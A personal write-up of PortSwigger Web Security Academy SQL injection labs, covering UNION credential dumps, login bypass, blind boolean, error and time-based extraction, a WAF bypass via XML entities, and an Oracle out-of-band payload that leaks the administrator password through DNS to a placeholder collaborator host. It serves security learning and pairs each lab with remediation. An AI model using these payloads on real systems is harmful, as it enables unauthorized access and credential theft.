---
layout: default
title: "PortSwigger — SQL Injection"
permalink: /write-ups/portswigger/sql-injection/
---

# PortSwigger — SQL Injection

## Overview

This page documents my notes and write-ups from the **SQL Injection** module of PortSwigger Web Security Academy.

SQL injection (SQLi) is a web vulnerability that lets an attacker interfere with the queries an application sends to its database. By injecting crafted input into a parameter that is concatenated into a SQL statement, an attacker can read data they are not authorized to see, modify or delete records, subvert application logic, and in some cases compromise the underlying server. SQLi has been behind many high-profile breaches and remains one of the most impactful vulnerability classes in web security.

This module progresses through increasingly constrained channels for recovering data. A useful way to frame the whole module is the idea of an **oracle**, any observable signal that reveals whether an injected condition is true or false. The technique changes as the oracle gets harder to read:

- **In-band:** the result of the injected query comes back directly in the HTTP response (retrieving hidden data, login bypass, `UNION` attacks, error-based disclosure).
- **Blind:** the result is not returned, so truth is inferred from a side effect, a conditional difference in the page, a conditional database error, a time delay, or an out-of-band network interaction.
- **Context / filter evasion:** the injection point sits inside a non-standard format (XML) and is protected by a WAF, which is bypassed by encoding the payload so the filter does not recognise it.

A recurring theme across the module is **database fingerprinting**: most detection and exploitation syntax differs between Oracle, PostgreSQL, MySQL, and Microsoft SQL Server, so identifying the DBMS is a prerequisite for choosing the right payload.

---

## Labs Covered and Main Technique

| # | Lab | Difficulty | Main Technique |
| --- | --- | --- | --- |
| 01 | SQL injection in WHERE clause allowing retrieval of hidden data | Apprentice | Comment / `OR 1=1` tautology |
| 02 | SQL injection allowing login bypass | Apprentice | `administrator'--` comment-out |
| 03 | UNION attack — determining the number of columns | Practitioner | `ORDER BY` + `UNION SELECT NULL` |
| 04 | UNION attack — finding a column containing text | Practitioner | Column type probing with a string |
| 05 | UNION attack — retrieving data from other tables | Practitioner | `UNION SELECT` credential dump |
| 06 | Examining the database — version on Oracle | Practitioner | `banner FROM v$version` |
| 07 | Examining the database — version on MySQL and Microsoft | Practitioner | `@@version` + comment handling |
| 08 | Examining the database — listing contents (non-Oracle) | Practitioner | `information_schema` enumeration |
| 09 | UNION attack — retrieving multiple values in a single column | Practitioner | String concatenation (`\|\|`) |
| 10 | Examining the database — listing contents (Oracle) | Practitioner | `all_tables` / `all_tab_columns` |
| 11 | Blind — conditional responses | Practitioner | Boolean oracle + binary search |
| 12 | Blind — conditional errors | Practitioner | `CASE WHEN` + conditional error |
| 13 | Visible error-based | Practitioner | `CAST` type-error disclosure |
| 14 | Blind — time delays | Practitioner | `pg_sleep` |
| 15 | Blind — time delays and information retrieval | Practitioner | Time-based oracle + Python script |
| 16 | Blind — out-of-band interaction | Practitioner | OAST / DNS (not executed, needs Burp Pro) |
| 17 | Blind — out-of-band data exfiltration | Practitioner | OAST / DNS exfiltration (not executed, needs Burp Pro) |
| 18 | SQL injection with filter bypass via XML encoding | Practitioner | WAF bypass via XML entities |

---

# Lab 01 — SQL injection in WHERE clause allowing retrieval of hidden data

## Objective

A shopping application filters products by category. The goal is to perform an injection that causes the application to display all products in every category, including unreleased ones.

## Methodology

Selecting a category produced a request of the form:

```
GET /filter?category=Accessories
```

I first probed the parameter for injectability by appending a single quote:

```
/filter?category=Accessories'
```

The application returned an internal server error, indicating that the input was being concatenated directly into a SQL statement.

I then injected a tautology, commenting out the remainder of the original query:

```
/filter?category=Accessories' OR 1=1--
```

The application displayed products from every category, including those not normally shown, solving the lab.

## Finding

The category parameter was concatenated into the `WHERE` clause of a query along the lines of:

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

Injecting `' OR 1=1--` turned the condition into:

```sql
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

The `OR 1=1` makes the `WHERE` clause evaluate to true for every row, and the `--` comments out the trailing `AND released = 1`.

## Impact

The lab validates an *effect* (all products displayed), not a specific string. The important distinction is between **removing a filter** and **nullifying the condition**: a payload such as `'--` would only comment out `AND released = 1`, revealing unreleased products *within the selected category*. The `OR 1=1` tautology returns the entire table regardless of category or release status. Any input that is concatenated into a query gives an attacker control over the logic of that query.

## Lesson Learned

User input must never be concatenated into a SQL statement. Parameterised (prepared) queries bind input as data, so a value like `' OR 1=1--` is treated as a literal category name rather than as SQL syntax. The single quote is the canonical first probe for injectability; in a real engagement, probing comes before exploitation.

---

# Lab 02 — SQL injection allowing login bypass

## Objective

Log in to the application as the `administrator` user without knowing the password.

## Methodology

I went directly to the login form and submitted:

- **Username:** `administrator'--`
- **Password:** any value (e.g. `asd`)

The application logged me in as `administrator`, solving the lab.

## Finding

The login query had the form:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'asd'
```

The single quote closes the username string and `--` comments out the rest of the line, eliminating the `AND password = '...'` check entirely. The application treats "the query returned a row" as a successful login, so authentication succeeds without any password validation.

## Impact

The `--` removes the *password* check but does not bypass the *username* match, a valid username must still be known or guessed. Injecting a non-existent username would return no rows and fail. This connects to username enumeration as a precursor technique.

It is also worth contrasting this with `' OR 1=1--` in the username field: that would return *all* rows, and most applications log the attacker in as the *first* row, typically not the administrator. `administrator'--` is therefore the more precise payload when targeting a specific account.

## Lesson Learned

Authentication logic must use parameterised queries, and passwords should be verified in application code against a stored hash rather than embedded directly in a `WHERE` clause. Treating the mere existence of a returned row as proof of authentication is a design flaw independent of the injection itself.

---

# Lab 03 — UNION attack: determining the number of columns

## Objective

Determine the number of columns returned by the product category query, as the first step of a `UNION`-based attack. The goal is to make an additional row of `NULL` values appear.

## Methodology

I used two complementary methods. First, `ORDER BY` with an incrementing index to find the column count:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   (valid)
' ORDER BY 4--   (internal server error)
```

`ORDER BY N` succeeds while `N` is within the number of columns and errors when it exceeds it. The highest value that did not error was `3`, so the query returns **3 columns**.

I then confirmed this with a `UNION`:

```
' UNION SELECT NULL,NULL,NULL--
```

This produced the expected additional row, solving the lab.

## Finding

A `UNION` requires both queries to have the same number of columns. `ORDER BY N` erroring at `N = 4` establishes a lower-bounded count, and the three-`NULL` `UNION` succeeding confirms the count is exactly 3. `NULL` is used because it is compatible with any data type, which separates the problem of *counting columns* from the problem of *matching column types*.

## Impact

Determining the column count is the mandatory first step of every `UNION` attack, without it, no `UNION` payload will execute. A note on rigour: `ORDER BY 3` succeeding only proves there are *at least* 3 columns; it is the successful three-value `UNION` that proves there are *exactly* 3, because `UNION` enforces an exact match.

## Lesson Learned

The same parameterised-query remediation applies. From an attacker's perspective, this lab establishes the disciplined, two-signal approach to reconnaissance: use `NULL` to count columns without interference from type errors, then validate with a second independent method.

---

# Lab 04 — UNION attack: finding a column containing text

## Objective

Determine which column in the query can hold string data, by making a provided random string appear in the response.

## Methodology

With the column count already known to be 3, I replaced one `NULL` at a time with the provided string value, testing each position:

```
' UNION SELECT NULL,'JXPrWH',NULL--
```

The string appeared in the response when placed in the second position, confirming that **column 2** is string-compatible, solving the lab.

## Finding

The random string provided by the lab must be reflected in the response. Testing one position at a time isolates which column accepts text: if a string is placed in a column of an incompatible type (e.g. integer), the query errors; the column that renders the string accepts text.

## Impact

This step maps the *output channel* for text exfiltration. The data worth stealing, usernames, passwords, version strings, is textual, so identifying a string-compatible column is a prerequisite for retrieving it. Testing one column at a time is the same isolation discipline used with `NULL` for counting: it makes the signal unambiguous.

## Lesson Learned

Parameterised queries prevent the `UNION` append entirely. The transferable technique is the deliberate separation of concerns: first count columns, then determine column types, each with an isolated test.

---

# Lab 05 — UNION attack: retrieving data from other tables

## Objective

Retrieve the username and password of the `administrator` from a `users` table and log in.

## Methodology

I combined the techniques from the previous labs. `ORDER BY 2` indicated at least two columns, and `UNION SELECT 'a','b'` confirmed both accept strings and that the count is exactly 2:

```
Gifts' UNION SELECT username, password FROM users--
```

The response listed all usernames and passwords. I logged in as `administrator` with the recovered credentials, solving the lab.

## Finding

The query returns 2 string-compatible columns, which maps directly onto the two values to retrieve (`username`, `password`) with no concatenation required. The absence of a restrictive `WHERE` clause in the injected `SELECT` dumps every row of the `users` table.

## Impact

This is the first lab that moves from *manipulating a query* to *exfiltrating sensitive data from another table* and escalating access. The impact is concrete: unauthorized disclosure of all stored credentials followed by authentication as a privileged account, a combined confidentiality breach and privilege escalation. The credentials being stored in plaintext aggravates the impact.

## Lesson Learned

Beyond parameterised queries, the database account used by the application should follow the principle of least privilege, and passwords must never be stored in plaintext. A single `UNION` with no row filter is sufficient to exfiltrate an entire table.

---

# Lab 06 — Examining the database: version on Oracle

## Objective

Display the database version string. This lab runs on Oracle.

## Methodology

With 2 string-compatible columns established, my first attempt failed:

```
Lifestyle' UNION SELECT 'A', @@version FROM dual--
```

This returned an internal server error. `@@version` is Microsoft SQL Server / MySQL syntax and does not exist in Oracle. On Oracle the version is stored in a system view, so the correct payload is:

```
Lifestyle' UNION SELECT 'VERSION:', BANNER FROM v$version--
```

This returned the Oracle version string, solving the lab. I used the first column as a `'VERSION:'` label to locate the data within the response.

## Finding

Oracle exposes version information in the `v$version` view (column `BANNER`), not through the `@@version` variable. Every Oracle `SELECT` also requires a `FROM` clause, here satisfied by `FROM v$version`.

## Impact

This is the first lab about *dialect* rather than *query structure*. The same intent ("give me the version") is written differently per DBMS, and using the wrong syntax produces a parse error rather than a wrong result, which means the failure itself is a fingerprinting signal. Knowing the DBMS and version drives every subsequent choice: concatenation, comment, and delay functions, and version-specific vectors.

**Version query by DBMS:**

| DBMS | Query |
| --- | --- |
| Oracle | `SELECT banner FROM v$version` |
| Microsoft SQL Server | `SELECT @@version` |
| MySQL | `SELECT @@version` or `version()` |
| PostgreSQL | `SELECT version()` |

## Lesson Learned

Parameterised queries remain the fix, alongside generic error messages that do not disclose database internals. Fingerprinting is performed per lab/instance, each lab runs its own DBMS, so the identification does not carry over from one lab to the next.

---

# Lab 07 — Examining the database: version on MySQL and Microsoft

## Objective

Display the database version string. This lab runs on MySQL or Microsoft SQL Server; my instance was MySQL.

## Methodology

With 2 string columns known, my first attempt returned an internal server error:

```
' ORDER BY 2--
```

I realised a trailing space after `--` was being stripped before reaching the server. Using `--+` (where `+` decodes to a space server-side) fixed the comment:

```
' ORDER BY 2--+
```

I then retrieved the version:

```
Gifts' UNION SELECT 'VERSION:',@@version FROM dual--+
```

The response returned `8.0.42-0ubuntu0.20.04.1`, solving the lab.

## Finding

The comment mechanism differs by DBMS: in MySQL, `--` is only treated as a comment if followed by a whitespace or control character. A literal trailing space in a URL is often trimmed, so the comment fails to close and the application's own closing quote is left dangling. `--+` works because `+` decodes to a space in the query string, arriving at MySQL as a valid `-- ` comment; `--%20` is equivalent.

## Impact

Correcting a misread here matters for documentation: `FROM dual` is **not** required by MySQL. Requiring `FROM` on every `SELECT` is Oracle behaviour; MySQL treats `FROM` as optional for constant/expression selects. MySQL tolerates `FROM dual` for compatibility but does not require it. The value returned, `8.0.42-0ubuntu0.20.04.1`, is the **MySQL version** (8.0.42); the `0ubuntu0.20.04.1` suffix is the package build identifier (built for Ubuntu 20.04), a hint about the OS in the build name rather than the OS version itself.

Consolidated "end-of-query" rules by DBMS: `FROM dual` required = Oracle; a space required after `--` = MySQL.

## Lesson Learned

Parameterised queries and generic error messages apply. The practical lesson is the comment-handling pitfall: a payload that is logically correct can still fail because of how the comment terminator is transmitted and interpreted.

---

# Lab 08 — Examining the database: listing the database contents (non-Oracle)

## Objective

Determine the name of the table containing user credentials, the names of its columns, and retrieve the administrator's password. This lab runs on PostgreSQL.

## Methodology

With 2 columns established, I first confirmed the DBMS:

```
Gifts' UNION SELECT 'version:',version()--
```

The response disclosed `PostgreSQL 12.22 (Ubuntu ...)`. I then enumerated the catalogue in three steps.

**1. List tables:**

```
Gifts' UNION SELECT table_name, table_type FROM information_schema.tables--
```

An initial attempt with `UNION SELECT * FROM information_schema.tables` caused an error, because that view has more than 2 columns and `*` breaks the `UNION` width requirement. Naming exactly two columns fixed it. The listing revealed a table named `users_ggcrmz`.

**2. List columns of that table:**

```
Gifts' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users_ggcrmz'--
```

This returned the columns `email`, `username_exvtbj`, and `password_bobpda`.

**3. Retrieve the credentials:**

```
Gifts' UNION SELECT username_exvtbj, password_bobpda FROM users_ggcrmz--
```

The response disclosed the administrator's credentials, which I used to log in.

## Finding

Most databases except Oracle expose an `information_schema` containing `tables` and `columns` views. Querying these in sequence, catalogue → table → columns → rows — forms the canonical enumeration funnel. Each step resolves the unknown that the next step requires.

## Impact

The table and column names were randomised (`_ggcrmz`, `_bobpda`, `_exvtbj`), so the attack was only possible by enumerating the catalogue. This demonstrates that obscuring table or column names is not a defense when the database exposes its own data dictionary. A practical refinement for real engagements is to exclude system schemas with `WHERE table_schema NOT IN ('pg_catalog','information_schema')` to filter out catalogue noise.

> **Note on views vs. tables:** The `information_schema` objects and `pg_*` objects are *views* over the database's internal state, not application tables created with data. The application's own table is the outlier with a business-domain name (`users...`), typed as a `BASE TABLE`. A related trap: `pg_user` / `pg_shadow` hold the DBMS's own accounts (roles), not the web application's users. On Oracle, which has no `information_schema`, the equivalents are `all_tables` and `all_tab_columns`.

## Lesson Learned

Parameterised queries prevent the enumeration. The database account should also have least-privilege access, ideally with no read access to the information schema where unnecessary, and credentials must never be stored in plaintext.

---

# Lab 09 — UNION attack: retrieving multiple values in a single column

## Objective

Retrieve the administrator's username and password when the query returns a single string-compatible column. This lab runs on PostgreSQL.

## Methodology

I confirmed the injection with a single quote (internal server error) and ran a version check out of habit. The original query returns 2 columns, of which only the second accepts strings. To retrieve two text values through one column, I concatenated them with a separator:

```
Gifts' UNION SELECT 1,username || ':' || password FROM users--
```

The response returned `administrator:hi36e1pf6p43ed01nqkt`. I logged in and solved the lab.

## Finding

The problem is exfiltrating two text values when only one string column is available. The solution is to concatenate them into a single column with a delimiter. The `1` holds the first (numeric) column; the concatenation occupies the single string column.

## Impact

The concatenation operator differs by DBMS: `||` on PostgreSQL and Oracle; `CONCAT()` on MySQL (where `||` is logical OR); `+` on SQL Server. The same symbol carries opposite meanings across systems, which is why fingerprinting precedes exploitation. The separator (`:`) provides a readable boundary; without it, `administratorhi36...` would be ambiguous. Concatenation decouples the *number of values exfiltrated* from the *number of string columns available*, with one text column, an attacker can in principle return an entire row.

A point of precision for the write-up: it is the *query* at that endpoint that projects a given number of columns, not the database, another page could run a query with a different column count.

## Lesson Learned

Parameterised queries and least privilege apply. This lab closes the `UNION` block by solving the final structural constraint: insufficient columns for the number of values desired.

---

# Lab 10 — Examining the database: listing the database contents (Oracle)

## Objective

Determine the name of the table containing user credentials and its columns, retrieve the administrator's password, and log in. This lab runs on Oracle, it is the Oracle counterpart of Lab 08.

## Methodology

With 2 string columns known, a column-count check with `UNION SELECT NULL,NULL--` unexpectedly failed. I recognised that Oracle requires a `FROM` clause, and `UNION SELECT NULL,NULL FROM dual--` worked. I then translated the Lab 08 enumeration funnel into Oracle dialect.

**1. List tables:**

```
Accessories' UNION SELECT TABLE_NAME, STATUS FROM all_tables--
```

This revealed the table `USERS_VLFTLK`.

**2. List columns:**

```
Accessories' UNION SELECT TABLE_NAME, COLUMN_NAME FROM all_tab_columns WHERE TABLE_NAME='USERS_VLFTLK'--
```

This returned the columns `USERNAME_JKVZDV` and `PASSWORD_TCCOCB`.

**3. Retrieve the credentials:**

```
Accessories' UNION SELECT USERNAME_JKVZDV, PASSWORD_TCCOCB FROM USERS_VLFTLK--
```

The response dumped the entire table, `administrator`, `carlos`, and `wiener`, and I logged in as `administrator`.

## Finding

Oracle has no `information_schema`. The equivalents are `all_tables` (to list tables) and `all_tab_columns` (to list columns), following the same catalogue → table → columns → rows funnel. The final query required no `dual` because it selects from a real table.

## Impact

Two Oracle-specific traps are relevant. First, the column-count check failed not because of the count but because of the missing `FROM`, a reminder to read *why* a query fails rather than just *that* it fails. Second, identifiers in the Oracle data dictionary are generally stored in uppercase, so filtering by a lowercase table name can fail to match. The final `UNION` with no row filter dumped the full credentials table, the classic "table dump" result reported as critical impact in a real assessment.

## Lesson Learned

Parameterised queries, least privilege (restricting the application account's access to the `all_*` catalogue views), and no plaintext passwords. Selecting `COLUMN_NAME, DATA_TYPE` is more informative than `TABLE_NAME, COLUMN_NAME` for the column listing, as it also reveals each column's type.

---

# Lab 11 — Blind SQL injection with conditional responses

## Objective

Recover the administrator's password where the query result is not returned, but the page displays a "Welcome back" message when the query returns at least one row. This lab runs on PostgreSQL.

## Methodology

The application uses a `TrackingId` cookie whose value is placed into a query whose result is not displayed. The only observable signal is the presence or absence of the "Welcome back" message, a **boolean oracle**.

I first fingerprinted the DBMS through the oracle itself:

- `@@version` → no "Welcome back" (invalid syntax)
- `version()` → "Welcome back" → PostgreSQL

I chose not to automate this first blind lab, in order to internalise the logic. I extracted all 20 characters manually by binary search, narrowing the candidate characters by half with each request until only `=` matched:

```
TrackingId=<id>' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), <pos>, 1) > '<char>'--
```

The recovered password let me log in and solve the lab.

## Finding

`SUBSTRING(text, start, length)` extracts one character at a time: the second argument is the position (iterated 1..N) and the third is fixed at 1. SQL indexes from 1, not 0. A binary search over the alphabet costs roughly five requests per character (log₂ of ~36) instead of ~36 for a linear scan.

## Impact

This is the foundational blind technique. Two conceptual layers are worth separating: *isolating the data* (`SUBSTRING` + comparison) and *reading the answer* (the boolean channel, here the "Welcome back" message). The character comparison with `>` was safe because the password is lowercase + digits (a contiguous ASCII range) and the collation behaved case-sensitively for that set. With a case-insensitive collation or mixed case, numeric comparison via `ASCII()`/`ORD()` or a binary comparison would be required instead.

## Lesson Learned

Parameterised queries remove the injection. The application should also avoid exposing any observable difference tied to the result of a query over sensitive data.

---

# Lab 12 — Blind SQL injection with conditional errors

## Objective

Recover the administrator's password where the page is identical whether the injected condition is true or false, and no data is returned. This lab runs on Oracle.

## Methodology

With no visible difference between true and false, I fabricated an oracle by forcing a database error on one branch of a condition, using `CASE WHEN`. A triggered error returns HTTP 500, a non-triggered condition returns 200.

Fingerprinting required care because the application returns a generic 500 regardless. I confirmed Oracle with a clean positive test:

```
' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,6)='Oracle'--
```

I ruled out PostgreSQL with an inversion test, two queries with the error trigger on opposite branches both returned 500, proving the error came from the *parse* stage (`version()` does not exist) rather than from the `CASE` logic.

The key dialect obstacle: on Oracle, mixing data types in the `CASE` branches (`THEN 'a' ELSE 1/0`, i.e. text and number) raises an error regardless of which branch is chosen, so a bare `1/0` never worked. Wrapping it in `TO_CHAR` keeps both branches textual:

```
TrackingId=<id>' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), <pos>, 1) = '<char>') THEN TO_CHAR(1/0) ELSE 'x' END FROM dual) = 'x'--
```

I extracted the full password using Burp Intruder, filtering by the distinguishing HTTP status.

## Finding

The oracle channel shifts from a page message (Lab 11) to an HTTP error. The character-isolation layer (`SUBSTR`) is unchanged, only the way the answer is read differs.

## Impact

This was the densest lab of the module, with several Oracle dialect traps worth documenting:

1. **`CASE` type-checking:** Oracle requires consistent types across branches. `TO_CHAR(1/0)` keeps the error branch textual. PortSwigger's generic example uses a bare `1/0` because it targets more permissive engines (PostgreSQL / MySQL / SQL Server).
2. **Scalar subquery returning multiple rows:** `SELECT banner FROM v$version` returns several rows, raising `ORA-01427` when used as a scalar value, fixed with `WHERE ROWNUM=1`.
3. **`FROM dual`** is required on `SELECT`s without a real table.
4. **`SUBSTR`**, not `SUBSTRING`, on Oracle.

Two debugging techniques proved broadly useful: the **inversion test** (swap the error-trigger branch, if the result does not change, the error is a parse error, not a logic result) and **variable isolation** (test each nested piece of a query separately until the failing one is found).

## Lesson Learned

Parameterised queries, generic error messages, and least privilege. The transferable skill is reading the *cause* of an error rather than its mere presence, and isolating variables when intuition fails.

---

# Lab 13 — Visible error-based SQL injection

## Objective

Leak the administrator's password through a verbose database error message. This lab runs on PostgreSQL.

## Methodology

The application exposes the full database error in the response. Appending a single quote disclosed the query and confirmed injectability. I forced a type-conversion error by casting the password to an integer, which makes PostgreSQL include the offending string in the error:

```
TrackingId=<id>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

The response returned `invalid input syntax for type integer: "<password>"`, leaking the password in a single request. I logged in to solve the lab.

## Finding

A verbose error message is itself a vulnerability: before any `CAST`, it already discloses the DBMS, version, the full assembled query, and its structure. Casting a text value to `int` triggers a conversion error whose message contains the text being converted.

## Impact

Several details are worth recording:

- `1=CAST(...)` rather than a bare `CAST(...)`: the `AND` operator requires a boolean expression. `CAST(...AS int)` is a number, which PostgreSQL rejects with *"argument of AND must be type boolean"* before executing the cast. Wrapping it as `1=CAST(...)` makes the expression boolean, lets the query proceed, and allows the desired conversion error to fire.
- `LIMIT 1` ensures a single-row scalar subquery; `OFFSET N` can iterate through rows.
- The application **truncates the `TrackingId` at a fixed length**. Long payloads such as `WHERE username='administrator'` do not fit and are cut off, so the comment characters are lost and the trailing quote dangles. Deleting the original `TrackingId` value frees characters; using `LIMIT 1` instead of a `WHERE` clause keeps the payload short.
- This operator-choice insight generalises: `AND` is used here because the lab *requires* breaking the query to trigger an error, if the goal were to validate a condition *without* breaking the query, `OR` would be used.

During exploitation, the truncation produced two different error messages depending on where the cut fell, an *unterminated string literal* when the cut left an open quote (a lexer-stage error that echoes the query), and a *syntax error at end of input* when the cut left an incomplete grammatical structure with no pending string (a parser-stage error that does not echo the query). Understanding this distinction explained why some errors included the assembled query and others did not.

## Lesson Learned

Parameterised queries, and critically, **never expose database error messages to the client**. Generic error pages deny the attacker the disclosure channel entirely.

---

# Lab 14 — Blind SQL injection with time delays

## Objective

Cause a 10-second delay to demonstrate a time-based blind injection. The application is fully blind, the response does not vary by content, error, or rows. This lab runs on PostgreSQL.

## Methodology

With no observable difference in the response, the only remaining channel is the *time* the response takes. I fingerprinted the DBMS by testing each engine's delay function and observing which one delayed the response. The payload that worked:

```
'||pg_sleep(10)--
```

The response was delayed, solving the lab.

## Finding

Forcing a delay confirms the injection executes even when nothing else is observable. The delay function is DBMS-specific:

| DBMS | Delay |
| --- | --- |
| PostgreSQL | `pg_sleep(10)` |
| MySQL | `SLEEP(10)` |
| Microsoft SQL Server | `'; WAITFOR DELAY '0:0:10'--` |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |

## Impact

The `||` concatenation forces execution because `pg_sleep` becomes part of the expression evaluated for the `id`. Pendant forms such as `' AND (SELECT ... pg_sleep ...)` can be skipped by the query optimiser via short-circuit evaluation when the left side is already false. The observed delay was roughly double the requested value, consistent with the tracking query executing twice per request. The `;` (stacked query) in the MS-SQL form appends a new statement rather than modifying the existing one, which not every DBMS supports.

## Lesson Learned

Parameterised queries, and the database stack should not permit delay functions to be reachable via user input.

---

# Lab 15 — Blind SQL injection with time delays and information retrieval

## Objective

Recover the administrator's password through a time-based blind injection. This lab runs on PostgreSQL.

## Methodology

The oracle is a conditional delay: a `CASE` expression that calls `pg_sleep` only when the tested condition is true.

```
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, <pos>, 1) = '<char>') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

A true condition delays the response (character correct), a false condition returns quickly. Reading a time-based oracle by hand across ~20 characters × ~36 candidates is infeasible, so I wrote a Python script to automate extraction, measuring `response.elapsed.total_seconds()` and treating a response above a threshold as a true condition.

The script recovered the full password (`ehxnj71xyoq64fcvt6sm`) and I logged in to solve the lab.

> **Tool:** The extraction script is published in my tooling repository:
> [`blind_time_based.py`](https://github.com/pedro18102601/pentest-scripts/blob/main/blind_time_based.py)

## Finding

The data-isolation layer (`SUBSTRING` + comparison) is identical to the earlier blind labs, only the oracle channel changes to response latency. The `ELSE pg_sleep(0)` branch makes the false case explicit, without an `ELSE`, the `CASE` returns `NULL` (no delay), which would also work but is less clear.

## Impact

This lab is where automation becomes a necessity rather than a convenience. Measuring latency programmatically is the only practical way to extract data over a time-based channel at scale. The payload must be URL-encoded within the cookie (comma `%2C`, semicolon `%3B`, equals `%3D`, etc.), or it is truncated, the same transmission pitfall seen in earlier labs. A `pg_sleep` of a few seconds, combined with a decision threshold set with margin, separates true from false reliably despite network jitter.

## Lesson Learned

Parameterised queries and least privilege. On the offensive side, the lesson is the value of writing purpose-built tooling: a short, well-understood script outperforms a throttled generic tool and deepens understanding of the underlying mechanism.

---

# Lab 16 — Blind SQL injection with out-of-band interaction

> **Note:** This lab was not executed. It requires Burp Collaborator to receive the out-of-band interaction. The Academy firewall blocks interactions with arbitrary external systems (including a self-hosted server or public OAST clients), permitting only the official Burp Collaborator, which is a Burp Suite Professional feature. The concept and payloads are documented below for completeness.

## Objective

Trigger a DNS lookup to an external domain, proving a blind injection in a context where the query is executed asynchronously and does not affect the application's response at all.

## Concept

When a query runs asynchronously, nothing in the HTTP response varies, not content, not error, not timing (the response returns before the query finishes). Every previous oracle fails, because all of them depend on observing the application's response. The out-of-band (OAST) technique sidesteps this by making the database itself open a separate network channel to a system the attacker controls. The data leaves through a different path, not through the HTTP response.

DNS is the preferred channel for two reasons: a backend database that cannot make outbound HTTP connections (blocked by an egress firewall) can almost always still perform DNS resolution, making it the path of least resistance, and data can be carried inside the queried hostname's subdomain, so the resolution attempt alone leaks the data.

## Payload (Oracle, the typical DBMS for this lab)

Oracle can be coerced into an external lookup through its XML parser, effectively an XXE within the SQL injection:

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %remote SYSTEM "http://<COLLABORATOR-ID>/"> %remote;]>'),'/l') FROM dual--
```

Other DBMS equivalents include `UTL_INADDR.get_host_address` (Oracle) and `xp_dirtree` (Microsoft SQL Server).

## Impact

OAST is the oracle of last resort: it extracts data where no other technique works, exfiltrates in volume, and evades detection because the interaction originates from the database server rather than the web application, leaving no trace in application logs.

## Lesson Learned

Parameterised queries. Defensively, database servers should not be permitted arbitrary outbound network access (egress filtering, including DNS), and XML parsing must be configured to disallow external entities.

---

# Lab 17 — Blind SQL injection with out-of-band data exfiltration

> **Note:** Not executed, for the same reason as Lab 16 (requires Burp Collaborator / Burp Suite Professional). Concept and payload documented below.

## Objective

Exfiltrate the administrator's password via an out-of-band DNS interaction.

## Concept

This lab uses the same OAST mechanism as Lab 16, but embeds the stolen data inside the subdomain of the triggered DNS lookup. When the database resolves `<password>.<COLLABORATOR-ID>`, the password appears in the attacker's DNS log, the entire value exfiltrated in a single request, with no binary search and no delay.

## Payload (Oracle)

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.<COLLABORATOR-ID>/"> %remote;]>'),'/l') FROM dual--
```

The password is concatenated into the hostname via `||` before the lookup.

## Impact

This is the most efficient exfiltration technique in the module: a full secret leaves in one request through a channel most defenders do not monitor. It demonstrates why OAST is considered the most severe of the blind techniques.

## Lesson Learned

Parameterised queries, egress filtering on database servers, and disabling external XML entity resolution.

---

# Lab 18 — SQL injection with filter bypass via XML encoding

## Objective

Perform a `UNION` attack to retrieve the administrator's credentials, bypassing a WAF that blocks SQL keywords. This lab runs on PostgreSQL.

## Methodology

The stock-check feature submits data as XML, and the `storeId` field is injectable:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
```

A normal request returns `284 units`. A payload that zeroes the result returns `0 units`, giving a boolean oracle (`284 units` = true, `0 units` = false). The WAF blocks SQL keywords such as `UNION` and `SELECT`, so I encoded the payload characters as XML character entities (e.g. `&#x53;` for `S`), which the WAF does not recognise but the XML parser decodes back to the original keywords before the query reaches the database.

I fingerprinted the DBMS through the boolean oracle (decoded):

```
2 AND (SELECT version()) LIKE 'PostgreSQL%'
```

This returned `284 units`, confirming PostgreSQL. `ORDER BY` established a single column. A `UNION SELECT version()` reflected text in the response, confirming the result is displayed in-band. The final payload (decoded):

```
2 UNION SELECT password FROM users WHERE username='administrator'
```

The password appeared in the response, and I logged in to solve the lab.

## Finding

The technique here is *evasion*, not extraction, the `UNION` itself was already familiar from Lab 05. The vulnerability is one of layer ordering: the WAF inspects the raw text *before* the XML parser decodes the entities, so a keyword hidden as `&#x53;ELECT` passes the filter and is reconstructed as `SELECT` before being passed to the database.

## Impact

This pattern, a filter that validates before a decoding/normalisation step, generalises well beyond XML (double URL-encoding, Unicode normalisation). Any time inspection happens before transformation, a payload can be hidden in the encoded form. Useful encoders for this: CyberChef's "To HTML Entity", Burp's Hackvertor extension (`hex_entities`), or a short custom script. In practice, encoding only the first character of each blocked keyword is often enough to break the filter's pattern match.

## Lesson Learned

Parameterised queries remain the real fix, a WAF is a secondary control and is bypassable by encoding. Input should be decoded and normalised *before* filtering, and validation must be applied at the correct layer, after the parser has resolved the input to its final form.

---

# General Takeaways

## Common Patterns Across Labs

Two ideas run through the entire module.

The first is the **oracle**: every blind technique is a way to read a single bit of information, true or false, through whatever side channel the application leaks. The channel changes (a page message, an HTTP error, a time delay, a DNS lookup), but the extraction logic, isolate one character with `SUBSTRING`/`SUBSTR`, ask a yes/no question, read the bit, stays the same. Separating *isolating the data* from *reading the answer* was the single most useful mental model.

The second is **dialect**. The same intent is written differently on Oracle, PostgreSQL, MySQL, and SQL Server, version queries, string concatenation, comment syntax, delay functions, data-dictionary views, and even type-checking strictness all vary. Using the wrong dialect produces a parse error, not a wrong answer, which makes fingerprinting both a prerequisite and a technique in its own right.

## Testing Methodology

My general workflow for SQL injection testing:

1. Identify every parameter whose value may reach a query, URL parameters, form fields, cookies, headers, and structured bodies (JSON, XML).
2. Probe for injectability with a single quote and observe for errors or behavioural changes.
3. Fingerprint the DBMS: test provider-specific syntax (version functions, `FROM dual`, comment handling) and observe which succeeds. When the response is blind, fingerprint through whatever oracle is available.
